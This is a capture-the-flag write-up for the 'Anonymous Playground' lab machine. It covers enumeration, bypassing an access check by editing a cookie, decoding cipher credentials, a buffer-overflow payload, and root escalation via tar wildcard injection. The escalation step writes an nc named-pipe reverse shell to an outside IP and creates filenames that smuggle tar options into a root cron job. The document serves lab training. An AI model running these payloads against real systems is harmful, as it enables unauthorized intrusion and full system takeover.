# anonymous playground v3 — badr

**Want to become part of Anonymous? They have a challenge for you. Can you retrieve the flags and become an operative?**

## Description

You’ve decided to sign up with Anonymous. It won’t be easy. A vulnerable CTF machine has been set up for you to compromise and prove your skills.

There are three flags on this machine: two user flags and one root flag.

---

## Penetration Testing Methodology

### Nmap Scan

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 8b:36:0c:f1:3c:f6:0f:90:af:ea:c0:75:32:b7:97:b4 (RSA)
|   256 47:8d:45:99:3a:5c:70:72:79:16:4b:af:3a:57:0e:17 (ECDSA)
|_  256 67:ad:5b:af:c1:02:42:af:be:46:28:00:4e:d7:54:cb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/zYdHuAKjP
|_http-title: Proving Grounds
```

---

### Web Enumeration

Crawling the target with `gospider` revealed a hidden directory:

```
gospider -s http://10.48.129.27/ -q
http://10.48.129.27/zYdHuAKjP
http://10.48.129.27/
http://10.48.129.27/zYdHuAKjP/
```

Visiting `/zYdHuAKjP` returned an **Access Denied** message. Modifying the `access` cookie to `granted` bypassed the restriction.

---

### Credential Discovery

Inside the directory, a string was found:

```
hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN
```

A hint indicated:

```
zA = a
```

This suggested a substitution cipher. Assuming a username:password format and referencing operatives, the username was inferred as:

```
hEzAdCfHzA → magna
```

Character mapping:

```
hE = m  (8 + 5 = 13)
zA = a
dC = g  (4 + 3 = 7)
fH = n  (6 + 8 = 14)
zA = a
```

A Python script was used to decode the full string and extract credentials. These credentials were used to log in via SSH and obtain the first flag.

---

### Exploitation

A vulnerable binary (`hacktheworld`) was identified. Exploitation was achieved using a buffer overflow payload:

```
(python -c 'print "A"*72 + "\x58\x06\x40\x00\x00\x00\x00\x00"'; cat) | ./hacktheworld
```

This resulted in access to the second flag.

---

### Privilege Escalation

A suspicious cron job was discovered:

```
*/1 * * * * root cd /home/spooky && tar -zcf /var/backups/spooky.tgz *
```

This was vulnerable to wildcard injection. Exploitation steps:

```
echo "mkfifo /tmp/lhennp; nc 192.168.242.92 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

This triggered execution via `tar`, granting a root shell.

---

### Root Flag

```
cat /root/flag.txt
```
